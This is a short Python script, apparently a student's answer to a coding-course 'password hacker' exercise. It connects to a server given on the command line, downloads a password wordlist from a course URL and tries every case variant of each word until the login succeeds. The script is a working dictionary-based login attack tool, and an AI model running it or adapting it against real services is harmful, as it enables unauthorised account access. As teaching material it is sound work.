# write your code here
import itertools
import socket
import sys
import urllib.request


def password_generator(length):
    for m in itertools.product(itertools.chain(range(97, 123), range(48, 58)), repeat=length):
        yield ''.join(map(chr, iter(m)))


def allperm(text):
    return list(map(''.join, itertools.product(*zip(text.lower(), text.upper()))))


args = sys.argv
ip = args[1]
port = int(args[2])

with socket.socket() as client_socket:
    address = (ip, port)
    client_socket.connect(address)
    message = 'Wrong password!'
    password = ""
    password_dictionary = urllib.request.urlopen('https://stepik.org/media/attachments/lesson/255258/passwords.txt')
    for pw in password_dictionary:

        for p in allperm(pw.decode().strip()):
            client_socket.send(p.encode())
            response = client_socket.recv(1024)
            message = response.decode()
            if message != 'Wrong password!':
                password = p
                break
        if message != 'Wrong password!':
            break

    if message == 'Connection success!':
        print(password)
    else:
        print("Unable to find the password from dictionary")

